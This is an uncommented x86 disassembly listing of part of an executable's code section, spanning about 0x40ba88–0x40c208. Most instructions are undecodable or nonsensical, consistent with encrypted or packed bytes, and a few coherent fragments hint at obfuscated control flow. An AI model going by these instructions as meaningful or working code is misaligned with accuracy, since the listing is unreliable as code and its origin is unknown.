  40ba88:	mov    al,ds:0x67e5aa4b
  40ba8d:	loopne 0x40ba41
  40ba8f:	xchg   esp,eax
  40ba90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba91:	stos   DWORD PTR es:[edi],eax
  40ba92:	dec    edx
  40ba93:	mov    ch,0x2b
  40ba95:	sub    al,0xb3
  40ba97:	pusha  
  40ba98:	pop    ss
  40ba99:	push   eax
  40ba9a:	outs   dx,DWORD PTR ds:[esi]
  40ba9b:	jbe    0x40bb1c
  40ba9d:	and    DWORD PTR [edx],ebp
  40ba9f:	inc    ebp
  40baa0:	mov    edx,0x8bca6b2d
  40baa5:	push   ebp
  40baa6:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	arpl   WORD PTR [ecx],sp
  40bace:	sub    dh,0x95
  40bad1:	cmp    DWORD PTR [esp+edi*2-0x36],0x79
  40bad6:	jl     0x40bb54
  40bad8:	pop    ss
  40bad9:	fs pop esi
  40badb:	mov    esi,0xd077b351
  40bae0:	push   0x367663c0
  40bae5:	ds fwait
  40bae7:	add    al,0x3
  40bae9:	sub    eax,DWORD PTR [edi+0x41475ffb]
  40baef:	std    
  40baf0:	aam    0xae
  40baf2:	sbb    eax,ebx
  40baf4:	cmp    eax,0xb0150cc6
  40baf9:	mov    cl,0x29
  40bafb:	dec    eax
  40bafc:	call   0x890f:0xd4f2595b
  40bb03:	push   eax
  40bb04:	adc    ah,BYTE PTR [ebx+eax*1-0x2b]
  40bb08:	mov    edx,0x8e97af24
  40bb0d:	xchg   DWORD PTR ds:[edx-0x70],edi
  40bb11:	mov    ebp,0x2575b4e7
  40bb16:	jns    0x40bb7c
  40bb18:	daa    
  40bb19:	push   eax
  40bb1a:	mov    dl,0x5
  40bb1c:	dec    ecx
  40bb1d:	xchg   DWORD PTR ds:0x266f02b6,ecx
  40bb23:	imul   ebp,DWORD PTR [ecx-0x4c62fd1],0xffffffd8
  40bb2a:	lahf   
  40bb2b:	ret    
  40bb2c:	data16 je 0x40bb07
  40bb2f:	xchg   esp,eax
  40bb30:	add    eax,0x7e65279c
  40bb35:	jb     0x40bb9c
  40bb37:	mov    ah,0xdf
  40bb39:	xchg   ecx,eax
  40bb3a:	pushf  
  40bb3b:	lds    esi,FWORD PTR ds:[esi]
  40bb3e:	pushf  
  40bb3f:	push   0xf9def82c
  40bb44:	in     al,dx
  40bb45:	mov    ah,0x1
  40bb47:	(bad)  
  40bb48:	in     eax,0xd1
  40bb4a:	icebp  
  40bb4b:	in     al,dx
  40bb4c:	push   0x5fa51d41
  40bb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb52:	mov    WORD PTR [eax],?
  40bb54:	data16 aas 
  40bb56:	leave  
  40bb57:	mov    WORD PTR [ebp-0x45ac62a8],gs
  40bb5d:	or     BYTE PTR [ebx-0x70f2560c],0x96
  40bb64:	icebp  
  40bb65:	ss pop esp
  40bb67:	neg    DWORD PTR [esi]
  40bb69:	mov    al,ds:0xdb9b9572
  40bb6e:	mov    ebp,0xe75192f4
  40bb73:	push   esi
  40bb74:	dec    esi
  40bb75:	and    DWORD PTR [ecx+0x40],0xb
  40bb79:	xor    DWORD PTR [edi-0x5c373d0a],0xffffff87
  40bb80:	mov    ds:0x3c8405a,eax
  40bb85:	aas    
  40bb86:	stc    
  40bb87:	sub    eax,0x126633f5
  40bb8c:	pop    es
  40bb8d:	cld    
  40bb8e:	mov    dh,0x52
  40bb90:	dec    edx
  40bb91:	push   ebp
  40bb92:	les    eax,FWORD PTR [esi+0x2e]
  40bb95:	enter  0x9079,0x91
  40bb99:	add    ah,BYTE PTR [esp+esi*1-0xf]
  40bb9d:	xchg   esi,eax
  40bb9e:	pop    ebp
  40bb9f:	nop
  40bba0:	shl    BYTE PTR [edi+0x3f],0x75
  40bba4:	aad    0xec
  40bba6:	fld    QWORD PTR [ebx+ecx*8-0x65123e02]
  40bbad:	xor    al,0x8b
  40bbaf:	xor    esi,ebx
  40bbb1:	retf   0xdf2a
  40bbb4:	adc    eax,0xc9fd9cac
  40bbb9:	aam    0x31
  40bbbb:	jb     0x40bb47
  40bbbd:	jmp    0x2ff8:0x81617535
  40bbc4:	fidivr DWORD PTR [edi+ecx*8-0x75]
  40bbc8:	push   ebx
  40bbc9:	mov    dl,0x48
  40bbcb:	pushf  
  40bbcc:	stc    
  40bbcd:	sbb    DWORD PTR [eax-0x40],esp
  40bbd0:	addr16 pop ss
  40bbd2:	or     eax,0x1dfab6a2
  40bbd7:	stc    
  40bbd8:	loopne 0x40bbb9
  40bbda:	inc    esi
  40bbdb:	pop    ebx
  40bbdc:	retf   0x4847
  40bbdf:	dec    ebp
  40bbe0:	sbb    al,0x67
  40bbe2:	jle    0x40bb86
  40bbe4:	js     0x40bc64
  40bbe6:	push   edi
  40bbe7:	mov    edi,0x4cfaaeac
  40bbec:	scas   eax,DWORD PTR es:[edi]
  40bbed:	add    DWORD PTR [edi-0x7eface63],eax
  40bbf3:	sbb    ebp,DWORD PTR [ebp-0x74]
  40bbf6:	jno    0x40bbbe
  40bbf8:	push   es
  40bbf9:	aad    0x8f
  40bbfb:	lahf   
  40bbfc:	jmp    0x7713:0xfc3c384d
  40bc03:	sbb    bl,dl
  40bc05:	mov    eax,0x7d973c87
  40bc0a:	loopne 0x40bc22
  40bc0c:	dec    esp
  40bc0d:	(bad)  
  40bc0e:	cld    
  40bc0f:	jmp    0x40bc43
  40bc11:	mov    ax,0x66d7
  40bc15:	inc    ecx
  40bc16:	ins    BYTE PTR es:[edi],dx
  40bc17:	in     eax,0xce
  40bc19:	jp     0x40bc5e
  40bc1b:	sub    ebp,0xffffffdf
  40bc1e:	scas   al,BYTE PTR es:[edi]
  40bc1f:	(bad)  
  40bc20:	push   edi
  40bc21:	or     esp,DWORD PTR [eax]
  40bc23:	mov    WORD PTR [ecx],fs
  40bc25:	loope  0x40bbb8
  40bc27:	div    BYTE PTR [esi+0xaf365a6]
  40bc2d:	stos   BYTE PTR es:[edi],al
  40bc2e:	jb     0x40bc3d
  40bc30:	mov    dl,BYTE PTR [ecx]
  40bc32:	push   cs
  40bc33:	jns    0x40bca4
  40bc35:	(bad)  
  40bc36:	and    edi,DWORD PTR [eax-0x60]
  40bc39:	and    al,0x2a
  40bc3b:	jnp    0x40bc46
  40bc3d:	and    ebx,esp
  40bc3f:	popf   
  40bc40:	xchg   esp,eax
  40bc41:	mov    ebp,0xe585c963
  40bc46:	daa    
  40bc47:	and    eax,DWORD PTR [ecx-0x3751ccea]
  40bc4d:	fidivr WORD PTR [edi]
  40bc4f:	jnp    0x40bc93
  40bc51:	or     BYTE PTR [edx],bl
  40bc53:	cmp    edi,ebp
  40bc55:	mov    ebp,0x72ef1b8
  40bc5a:	jmp    0xd5db:0xcb31222f
  40bc61:	dec    ebp
  40bc62:	jmp    0x5921:0x52886bf7
  40bc69:	dec    ebp
  40bc6a:	idiv   BYTE PTR [ecx-0x4a]
  40bc6d:	rcr    DWORD PTR [edi+edi*2],1
  40bc70:	fild   WORD PTR fs:[edx+0x51395e0b]
  40bc77:	ins    DWORD PTR es:[edi],dx
  40bc78:	inc    ebx
  40bc79:	and    dl,BYTE PTR [ecx+ebx*4-0x47]
  40bc7d:	mov    al,ds:0x55bcf03
  40bc82:	xchg   edx,eax
  40bc83:	dec    ebp
  40bc84:	jmp    0x2ee3:0x90e69e1a
  40bc8b:	shl    DWORD PTR [edx+0x7b],1
  40bc8e:	ja     0x40bcfa
  40bc90:	xchg   edx,eax
  40bc91:	scas   eax,DWORD PTR es:[edi]
  40bc92:	mov    cl,dh
  40bc94:	lods   al,BYTE PTR ds:[esi]
  40bc95:	mov    dl,BYTE PTR [edx]
  40bc97:	enter  0x477f,0x51
  40bc9b:	adc    al,0x44
  40bc9d:	sbb    eax,0xeaef7cb2
  40bca2:	sbb    al,0x95
  40bca4:	and    DWORD PTR [eax],ebx
  40bca6:	pop    ds
  40bca7:	pop    ecx
  40bca8:	cmp    al,0xe1
  40bcaa:	lods   al,BYTE PTR ds:[esi]
  40bcab:	sti    
  40bcac:	xor    bh,BYTE PTR [ebp-0x52]
  40bcaf:	dec    esp
  40bcb0:	das    
  40bcb1:	sub    cl,al
  40bcb3:	mov    bh,0x23
  40bcb5:	sbb    al,0x63
  40bcb7:	sub    edx,DWORD PTR [ecx+esi*2+0x6]
  40bcbb:	pop    eax
  40bcbc:	inc    ebp
  40bcbd:	jns    0x40bd36
  40bcbf:	push   ds
  40bcc0:	cli    
  40bcc1:	add    eax,0x18a10507
  40bcc6:	adc    cl,bl
  40bcc8:	rcl    ecx,1
  40bcca:	outs   dx,DWORD PTR ds:[esi]
  40bccb:	scas   eax,DWORD PTR es:[edi]
  40bccc:	fadd   st(2),st
  40bcce:	inc    edx
  40bccf:	mov    cl,0x30
  40bcd1:	mov    bl,0xbc
  40bcd3:	add    ecx,DWORD PTR [eax-0x6c2a9459]
  40bcd9:	jmp    0x2f643727
  40bcde:	inc    eax
  40bcdf:	repnz call 0x5e62:0x6cd9e390
  40bce7:	fcomp  QWORD PTR [ebx+eax*1-0x3f]
  40bceb:	mov    es,WORD PTR [esi+0x167f94cf]
  40bcf1:	inc    esi
  40bcf2:	mov    eax,0x866b72a4
  40bcf7:	dec    ebp
  40bcf8:	push   edi
  40bcf9:	lods   al,BYTE PTR ds:[esi]
  40bcfa:	test   eax,0x672ce880
  40bcff:	sbb    bl,BYTE PTR [esi+0x25b0b691]
  40bd05:	jmp    0xd071:0x9f712a35
  40bd0c:	pop    es
  40bd0d:	mov    ecx,0x3271d892
  40bd12:	in     al,dx
  40bd13:	sbb    ch,0xba
  40bd16:	fsubr  st(3),st
  40bd18:	xchg   BYTE PTR [ebp+0x33e2e36],dl
  40bd1e:	(bad)  
  40bd1f:	clc    
  40bd20:	adc    ecx,ebp
  40bd22:	and    BYTE PTR [esi-0xd66b5a8],0xef
  40bd29:	dec    ecx
  40bd2a:	sub    ebx,esi
  40bd2c:	mov    ebx,0xc3846e47
  40bd31:	adc    DWORD PTR [edi],ebp
  40bd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd35:	in     eax,dx
  40bd36:	icebp  
  40bd37:	inc    eax
  40bd38:	aaa    
  40bd39:	push   edi
  40bd3a:	cmp    eax,edi
  40bd3c:	cdq    
  40bd3d:	pop    edi
  40bd3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd3f:	jg     0x40bcf8
  40bd41:	inc    DWORD PTR [edx]
  40bd43:	jbe    0x40bd63
  40bd45:	and    bl,0xf1
  40bd48:	mov    edx,DWORD PTR [eax]
  40bd4a:	dec    ebx
  40bd4b:	pop    edi
  40bd4c:	ret    
  40bd4d:	clc    
  40bd4e:	test   eax,0xd8b15cd7
  40bd53:	(bad)  
  40bd54:	addr16 inc esp
  40bd56:	bound  eax,QWORD PTR [edi]
  40bd58:	jle    0x40bce6
  40bd5a:	das    
  40bd5b:	cmc    
  40bd5c:	xchg   esp,eax
  40bd5d:	(bad)  
  40bd5e:	push   edi
  40bd5f:	xor    BYTE PTR [ebp-0xd],al
  40bd62:	(bad)  
  40bd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd64:	sbb    esi,DWORD PTR [ebx]
  40bd66:	pop    esi
  40bd67:	add    bl,BYTE PTR [esp+eax*2]
  40bd6a:	fadd   DWORD PTR [ebx]
  40bd6c:	clc    
  40bd6d:	test   al,0x61
  40bd6f:	adc    eax,0xbcf6ed70
  40bd74:	mov    ds:0x6ea25136,eax
  40bd79:	cwde   
  40bd7a:	inc    esi
  40bd7b:	jg     0x40bdbb
  40bd7d:	dec    ebx
  40bd7e:	imul   bl
  40bd80:	loopne 0x40bd36
  40bd82:	mov    al,ds:0x53f19e00
  40bd87:	adc    bl,0xdc
  40bd8a:	es cdq 
  40bd8c:	add    edi,edx
  40bd8e:	pop    esi
  40bd8f:	test   BYTE PTR [esi-0x496ee53c],ch
  40bd95:	retf   0xef7f
  40bd98:	(bad)  
  40bd99:	cld    
  40bd9a:	bnd jle 0x40bd37
  40bd9d:	aas    
  40bd9e:	leave  
  40bd9f:	and    DWORD PTR [esi],ebp
  40bda1:	in     eax,0x8e
  40bda3:	mov    eax,ds:0x3c4caabc
  40bda8:	repz push esi
  40bdaa:	in     al,0x2a
  40bdac:	jo     0x40bd6c
  40bdae:	loopne 0x40bd34
  40bdb0:	call   0x80f60dc
  40bdb5:	mov    BYTE PTR [ebx+0x9],dh
  40bdb8:	leave  
  40bdb9:	sbb    ebx,ebx
  40bdbb:	push   esp
  40bdbc:	das    
  40bdbd:	scas   al,BYTE PTR es:[edi]
  40bdbe:	jno    0x40be18
  40bdc0:	push   edi
  40bdc1:	ret    0x52fe
  40bdc4:	sbb    al,BYTE PTR [edx+0x6444bcfd]
  40bdca:	pop    ecx
  40bdcb:	fsub   QWORD PTR [eax-0xc]
  40bdce:	lock mov ebp,0xd814a936
  40bdd4:	cdq    
  40bdd5:	loope  0x40bdf0
  40bdd7:	mov    DWORD PTR [edi],0x630d9a16
  40bddd:	repz loop 0x40bd71
  40bde0:	cmp    al,0xf9
  40bde2:	push   ss
  40bde3:	jae    0x40be45
  40bde5:	call   0x6c611b5
  40bdea:	cmp    ebx,DWORD PTR ds:0x92bbddea
  40bdf0:	sub    edx,ebx
  40bdf2:	sbb    DWORD PTR [ebp+0x4ff9344],ecx
  40bdf8:	mov    ds:0x3bd639fa,eax
  40bdfd:	or     bh,dh
  40bdff:	mov    WORD PTR [ecx-0x14998f71],cs
  40be05:	jb     0x40be51
  40be07:	outs   dx,DWORD PTR ds:[esi]
  40be08:	mov    ch,0xe2
  40be0a:	dec    esp
  40be0b:	mov    bl,0x6b
  40be0d:	adc    eax,0x1a67a2b4
  40be12:	in     eax,dx
  40be13:	mov    cl,BYTE PTR [eax+0x23]
  40be16:	and    eax,0x54fc42b6
  40be1b:	xor    DWORD PTR [edi+0x81498d0],0xd95e390f
  40be25:	xchg   edi,eax
  40be26:	ja     0x40bea2
  40be28:	outs   dx,DWORD PTR ds:[esi]
  40be29:	stos   DWORD PTR es:[edi],eax
  40be2a:	fisub  WORD PTR [esp+ecx*4-0x1f]
  40be2e:	mov    DWORD PTR [ebp-0x24],edx
  40be31:	mov    edx,DWORD PTR [ebp-0x8]
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	sahf   
  40be66:	in     al,dx
  40be67:	xchg   esp,eax
  40be68:	push   edi
  40be69:	arpl   WORD PTR [esp+edi*2+0x7c79ca7c],cx
  40be70:	jl     0x40bdf6
  40be72:	mov    edx,0xf8184a4a
  40be77:	shl    DWORD PTR [esp+eiz*4],0xc1
  40be7b:	mov    esp,0xd462b24
  40be80:	rol    edi,1
  40be82:	mov    esp,0xad78b628
  40be87:	loopne 0x40be1c
  40be89:	adc    BYTE PTR [ecx+eax*2+0x6da2538b],al
  40be90:	fst    QWORD PTR [ecx+ebx*8+0xe]
  40be94:	fdiv   QWORD PTR [ebx+0x7a]
  40be97:	(bad)  
  40be98:	jmp    FWORD PTR [ecx-0x13]
  40be9b:	(bad)  
  40be9c:	sbb    esi,ecx
  40be9e:	loopne 0x40bec5
  40bea0:	lods   eax,DWORD PTR ds:[esi]
  40bea1:	push   ebx
  40bea2:	stc    
  40bea3:	inc    ecx
  40bea4:	icebp  
  40bea5:	les    edx,FWORD PTR [esi+0x2e]
  40bea8:	movsx  ebp,BYTE PTR [edi-0x7eecbd15]
  40beaf:	add    esp,DWORD PTR [edx-0x36a9595a]
  40beb5:	jne    0x40beaf
  40beb7:	mov    WORD PTR [edi-0x64],?
  40beba:	(bad)  
  40bebb:	cmp    al,0xbf
  40bebd:	cmp    DWORD PTR [esi+edi*1],esi
  40bec0:	das    
  40bec1:	aad    0x93
  40bec3:	and    eax,0xecc2966c
  40bec8:	and    DWORD PTR [esi-0x4b1f91e2],edx
  40bece:	jne    0x40bef6
  40bed0:	addr16 je 0x40bf08
  40bed3:	retf   
  40bed4:	inc    esp
  40bed5:	fdivr  st,st(3)
  40bed7:	mov    gs,edx
  40bed9:	mov    cl,al
  40bedb:	mov    al,ds:0x23231918
  40bee0:	sub    eax,0x7dca23d5
  40bee5:	or     DWORD PTR [eax+0x3b],0xcfd650fa
  40beec:	int    0x69
  40beee:	adc    dh,0x31
  40bef1:	test   eax,0xdd838cb0
  40bef6:	and    dh,ah
  40bef8:	retf   
  40bef9:	sbb    DWORD PTR [edi-0x75],ecx
  40befc:	shl    BYTE PTR [edi-0x79e95689],0x97
  40bf03:	lahf   
  40bf04:	xlat   BYTE PTR ds:[ebx]
  40bf05:	aaa    
  40bf06:	pusha  
  40bf07:	fisttp QWORD PTR [edi+0x54]
  40bf0a:	ins    DWORD PTR es:[edi],dx
  40bf0b:	pop    ss
  40bf0c:	mov    DWORD PTR [esi],edi
  40bf0e:	shl    BYTE PTR [ebx+0x17],1
  40bf11:	in     al,dx
  40bf12:	popf   
  40bf13:	sar    dh,cl
  40bf15:	pop    edx
  40bf16:	mov    ah,0x26
  40bf18:	and    ah,dh
  40bf1a:	push   esi
  40bf1b:	rcl    BYTE PTR [ebp+0x14],cl
  40bf1e:	jp     0x40bf3f
  40bf20:	int3   
  40bf21:	inc    esi
  40bf22:	test   DWORD PTR [esi+0x52],ebx
  40bf25:	add    dl,ah
  40bf27:	add    bl,dh
  40bf29:	add    eax,ebx
  40bf2b:	div    BYTE PTR [ebx]
  40bf2d:	mov    al,ds:0xb5ece0bd
  40bf32:	popf   
  40bf33:	and    BYTE PTR [ebx+0x64],bl
  40bf36:	cmp    ecx,DWORD PTR [ebp-0x7c]
  40bf39:	std    
  40bf3a:	mov    al,ds:0x4251da3d
  40bf3f:	lock fnstsw WORD PTR [esi]
  40bf42:	xchg   ebx,eax
  40bf43:	lock ins DWORD PTR es:[edi],dx
  40bf45:	ds add al,0x67
  40bf48:	popf   
  40bf49:	(bad)  
  40bf4a:	in     al,dx
  40bf4b:	sbb    DWORD PTR [ebx-0xbf56678],edx
  40bf51:	xchg   edx,eax
  40bf52:	pop    esi
  40bf53:	jmp    0xe513:0xf9560c77
  40bf5a:	call   0xbfaab233
  40bf5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf60:	aad    0xb0
  40bf62:	adc    al,0x36
  40bf64:	pop    esi
  40bf65:	or     al,BYTE PTR [edx]
  40bf67:	and    al,0x1b
  40bf69:	xchg   esi,eax
  40bf6a:	jle    0x40bf24
  40bf6c:	(bad)  
  40bf6d:	sub    esp,esi
  40bf6f:	mov    WORD PTR [edx+eiz*8+0x83c6150],?
  40bf76:	pop    ebx
  40bf77:	and    eax,ecx
  40bf79:	int    0x89
  40bf7b:	mov    edi,0x9e95d76e
  40bf80:	inc    esp
  40bf81:	jecxz  0x40bf66
  40bf83:	push   0x6f
  40bf85:	xor    DWORD PTR [edx],eax
  40bf87:	test   BYTE PTR [edx*1-0x793b51ae],bh
  40bf8e:	repnz test eax,0x9fd1b793
  40bf94:	ret    
  40bf95:	mov    eax,ds:0x3e96d7c3
  40bf9a:	add    BYTE PTR [edi-0x60],ah
  40bf9d:	je     0x40bf80
  40bf9f:	mov    bx,si
  40bfa2:	inc    esi
  40bfa3:	jne    0x40bf9d
  40bfa5:	jmp    0xee81416d
  40bfaa:	inc    edi
  40bfab:	mov    dh,0x26
  40bfad:	ins    BYTE PTR es:[edi],dx
  40bfae:	push   eax
  40bfaf:	xor    eax,0xd47fd78f
  40bfb4:	mov    BYTE PTR [edx-0x64],ch
  40bfb7:	xchg   BYTE PTR [ebp-0x1cb53e7d],cl
  40bfbd:	clc    
  40bfbe:	out    dx,eax
  40bfbf:	mov    ah,0x2e
  40bfc1:	pop    es
  40bfc2:	rol    BYTE PTR [ebx+0x6e],cl
  40bfc5:	cmp    ch,BYTE PTR ds:0xadc42f67
  40bfcb:	popa   
  40bfcc:	mov    dh,ah
  40bfce:	es mov ebp,es
  40bfd1:	imul   eax,DWORD PTR gs:[esp+esi*2+0xd],0x5ccae7dd
  40bfda:	sub    al,0xec
  40bfdc:	cli    
  40bfdd:	and    dh,ch
  40bfdf:	jns    0x40bfe8
  40bfe1:	mov    esp,DWORD PTR [edx+0x51fe5abf]
  40bfe7:	mov    ch,0xc
  40bfe9:	fidivr DWORD PTR fs:0x9b09f557
  40bff0:	iret   
  40bff1:	fnsave [ebx-0x1e]
  40bff4:	out    0xb2,eax
  40bff6:	rol    BYTE PTR [ecx-0x62],0x4f
  40bffa:	aas    
  40bffb:	xchg   edi,eax
  40bffc:	xor    edx,0xffffff82
  40bfff:	sti    
  40c000:	cmp    BYTE PTR [eax+eiz*2+0x73],bh
  40c004:	ror    BYTE PTR [edx],1
  40c006:	sbb    DWORD PTR [ebp+0x4025c70],ecx
  40c00c:	das    
  40c00d:	pop    ebx
  40c00e:	jge    0x40bfc7
  40c010:	mov    ah,0x45
  40c012:	or     DWORD PTR [eax-0x41],0x32
  40c016:	enter  0xa2f,0xe7
  40c01a:	scas   al,BYTE PTR es:[edi]
  40c01b:	sub    al,0x1c
  40c01d:	sub    edx,DWORD PTR [edi]
  40c01f:	arpl   WORD PTR [eax-0x56],ax
  40c022:	add    BYTE PTR ds:0xf8f35d76,bl
  40c028:	jae    0x40c0a7
  40c02a:	adc    al,0xdb
  40c02c:	xchg   ebx,eax
  40c02d:	sti    
  40c02e:	push   eax
  40c02f:	add    al,0x91
  40c031:	in     al,dx
  40c032:	cdq    
  40c033:	(bad)  
  40c035:	aaa    
  40c036:	outs   dx,DWORD PTR ds:[esi]
  40c037:	in     eax,dx
  40c038:	jge    0x40c073
  40c03a:	adc    ah,BYTE PTR [esi-0x7bd2a34c]
  40c040:	or     al,0x12
  40c042:	stos   BYTE PTR es:[edi],al
  40c043:	inc    eax
  40c044:	retf   
  40c045:	push   esp
  40c046:	mov    eax,ds:0xb7a75a09
  40c04b:	fld    QWORD PTR [edx]
  40c04d:	aad    0x59
  40c04f:	push   edx
  40c050:	data16 loope 0x40c039
  40c053:	nop
  40c054:	pop    edi
  40c055:	outs   dx,DWORD PTR ds:[esi]
  40c056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c057:	push   eax
  40c058:	adc    bl,BYTE PTR [eax]
  40c05a:	stos   BYTE PTR es:[edi],al
  40c05b:	hlt    
  40c05c:	(bad)  
  40c05d:	mov    ebx,esi
  40c05f:	mov    edx,DWORD PTR [edx+ebp*8-0x1e]
  40c063:	in     al,0xed
  40c065:	psubusw mm3,mm3
  40c068:	xor    al,0xe7
  40c06a:	loope  0x40c089
  40c06c:	mov    esi,0xea442ad7
  40c071:	mov    al,ds:0x13c7cc59
  40c076:	repnz push ds
  40c078:	mov    bl,0x2f
  40c07a:	adc    eax,0x3c46246c
  40c07f:	idiv   DWORD PTR [edi]
  40c081:	hlt    
  40c082:	daa    
  40c083:	pop    esp
  40c084:	add    eax,0x21ae9d6a
  40c089:	out    0x7e,al
  40c08b:	push   edi
  40c08c:	ror    BYTE PTR [eax],cl
  40c08e:	mov    DWORD PTR [esi+0x7a],ecx
  40c091:	lahf   
  40c092:	xchg   BYTE PTR [esi-0x653fd892],ah
  40c098:	and    al,0xe2
  40c09a:	push   ds
  40c09b:	popa   
  40c09c:	test   BYTE PTR [edi-0x48],dl
  40c09f:	sub    edx,edi
  40c0a1:	xchg   edi,eax
  40c0a2:	and    edx,DWORD PTR [edi+0x1093899f]
  40c0a8:	pop    ecx
  40c0a9:	jmp    0x7ce61397
  40c0ae:	pop    ds
  40c0af:	or     DWORD PTR [ebx-0x6c],edi
  40c0b2:	aad    0x97
  40c0b4:	xchg   ebx,eax
  40c0b5:	fmul   DWORD PTR [edi-0x59ad7141]
  40c0bb:	pop    edx
  40c0bc:	and    cl,BYTE PTR [ecx]
  40c0be:	sbb    eax,0x5f31227a
  40c0c3:	mov    eax,ds
  40c0c5:	mov    ebx,0x2e33878b
  40c0ca:	pop    ecx
  40c0cb:	xlat   BYTE PTR ds:[ebx]
  40c0cc:	push   ds
  40c0cd:	mov    ds,WORD PTR [ebx-0x3b38ce0b]
  40c0d3:	call   0xbfa7:0xb7624832
  40c0da:	sbb    al,BYTE PTR [eax]
  40c0dc:	jp     0x40c0cb
  40c0de:	aad    0xec
  40c0e0:	into   
  40c0e1:	fsubp  st(2),st
  40c0e3:	pop    edi
  40c0e4:	add    eax,0x67340272
  40c0e9:	or     ah,bl
  40c0eb:	out    0x7b,eax
  40c0ed:	leave  
  40c0ee:	push   esp
  40c0ef:	ins    DWORD PTR es:[edi],dx
  40c0f0:	loopne 0x40c0a8
  40c0f2:	scas   eax,DWORD PTR es:[edi]
  40c0f3:	bound  esi,QWORD PTR [ebx+0x63]
  40c0f6:	lock in al,0x4a
  40c0f9:	xchg   esp,eax
  40c0fa:	and    al,0x2a
  40c0fc:	je     0x40c0ca
  40c0fe:	dec    ecx
  40c0ff:	xchg   edx,eax
  40c100:	iret   
  40c101:	pop    ebx
  40c102:	pop    esp
  40c103:	mov    al,ds:0x87da3df0
  40c108:	popf   
  40c109:	mov    eax,ds:0x6da6356a
  40c10e:	dec    ecx
  40c10f:	sbb    eax,0x384cb6cc
  40c114:	cld    
  40c115:	mov    ds:0x4435675e,al
  40c11a:	daa    
  40c11b:	rcl    DWORD PTR [edi+ecx*4-0x9],1
  40c11f:	bound  edx,QWORD PTR [ecx-0x2dd68d29]
  40c125:	add    DWORD PTR [edi+0x590730d],ebx
  40c12b:	cli    
  40c12c:	adc    DWORD PTR [edi+0x14daf888],ebp
  40c132:	mov    ecx,0xfc639e6f
  40c137:	mov    cs,esp
  40c139:	dec    ebp
  40c13a:	call   0x65ce:0x7c4397d5
  40c141:	lods   eax,DWORD PTR ds:[esi]
  40c142:	ins    DWORD PTR es:[edi],dx
  40c143:	jge    0x40c13b
  40c145:	ret    
  40c146:	cdq    
  40c147:	pop    ecx
  40c148:	repz jmp 0x9702:0xbf52aa4f
  40c150:	jnp    0x40c196
  40c152:	sti    
  40c153:	cmp    BYTE PTR ds:0x47782af3,bl
  40c159:	adc    eax,0x55853158
  40c15e:	mov    dh,BYTE PTR [ecx]
  40c160:	or     eax,DWORD PTR [edx+edi*4]
  40c163:	jle    0x40c10a
  40c165:	mov    ds:0x47138487,al
  40c16a:	test   eax,0xf5ef0543
  40c16f:	ss icebp 
  40c171:	inc    ebp
  40c172:	xchg   ebx,eax
  40c173:	ret    0x8bfa
  40c176:	jb     0x40c16a
  40c178:	loopne 0x40c1ca
  40c17a:	dec    esi
  40c17b:	dec    ecx
  40c17c:	ja     0x40c0ff
  40c17e:	(bad)  
  40c17f:	adc    bh,dl
  40c181:	sub    eax,0x9797888e
  40c186:	inc    ebp
  40c187:	test   DWORD PTR [ebp-0x21d8d9e8],esp
  40c18d:	fidivr DWORD PTR [ebp+0x59]
  40c190:	add    edx,0x171a411c
  40c196:	retf   0x381e
  40c199:	(bad)  
  40c19b:	aad    0x5f
  40c19d:	cs jmp 0x40c162
  40c1a0:	push   ss
  40c1a1:	push   0xffffff93
  40c1a3:	jo     0x40c1d8
  40c1a5:	mov    esp,0xf6af58d6
  40c1aa:	add    edi,eax
  40c1ac:	cdq    
  40c1ad:	idiv   edi
  40c1af:	mov    eax,ds:0x41aff986
  40c1b4:	ja     0x40c234
  40c1b6:	push   esi
  40c1b7:	cmp    DWORD PTR [esi-0x465d3181],0xdd383206
  40c1c1:	add    ebx,DWORD PTR [ebx]
  40c1c3:	push   ss
  40c1c4:	shr    DWORD PTR [esi],cl
  40c1c6:	inc    DWORD PTR [ebx]
  40c1c8:	shr    ecx,1
  40c1ca:	ror    DWORD PTR [edx],0x0
  40c1cd:	add    cl,ch
  40c1cf:	outs   dx,BYTE PTR ds:[esi]
  40c1d0:	add    eax,DWORD PTR [eax]
  40c1d2:	add    BYTE PTR [esi],dl
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	pop    ebx
  40c1e0:	aad    0xc
  40c1e2:	jmp    0x40c21d
  40c1e4:	mov    BYTE PTR [esp+edi*2-0x36],bh
  40c1e8:	jns    0x40c266
  40c1ea:	jl     0x40c259
  40c1ec:	pop    ebp
  40c1ed:	jmp    0x830a0571
  40c1f2:	sub    al,0x53
  40c1f4:	and    bh,BYTE PTR [ebx+0x54]
  40c1f7:	into   
  40c1f8:	mov    esp,0x7820531
  40c1fd:	jmp    0xa3b1:0x9a440941
  40c204:	hlt    
  40c205:	jno    0x40c26f
  40c207:	xchg   ebp,eax
  40c208:	push   ds
